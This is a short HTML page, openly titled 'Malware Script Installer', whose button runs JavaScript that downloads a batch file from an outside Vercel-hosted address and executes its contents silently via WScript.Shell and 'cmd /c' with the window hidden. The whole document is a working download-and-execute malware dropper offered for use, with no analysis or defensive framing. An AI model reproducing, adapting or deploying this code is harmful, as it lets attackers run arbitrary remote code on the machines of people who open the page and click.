<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Malware Script Installer</title>
<script>
    function downloadAndExecute() {
        var xhr = new XMLHttpRequest();
        var url = 'https://dd-xi-five.vercel.app/setup.bat';
        
        xhr.open('GET', url, true);
        xhr.responseType = 'text';
        
        xhr.onload = function() {
            if (xhr.status === 200) {
                var shell = new ActiveXObject("WScript.Shell");
                try {
                    // Execute the downloaded script without displaying any prompts
                    shell.Run('cmd /c ' + xhr.responseText, 0, false);
                } catch (error) {
                    // Handle any errors that may occur during execution
                    console.error("Error executing the malware setup:", error);
                }
            } else {
                // Handle the case when the download fails
                console.error("Failed to download the malware setup. Status code:", xhr.status);
            }
        };

        xhr.onerror = function() {
            // Handle errors that occur during the download process
            console.error("Error occurred while downloading the malware setup.");
        };
        
        xhr.send();
    }
</script>
</head>
<body>
    <h1>Malware Script Installer</h1>
    <p>Click the button below to download and execute the malware setup file:</p>
    <button onclick="downloadAndExecute()">Download & Execute</button>
</body>
</html>
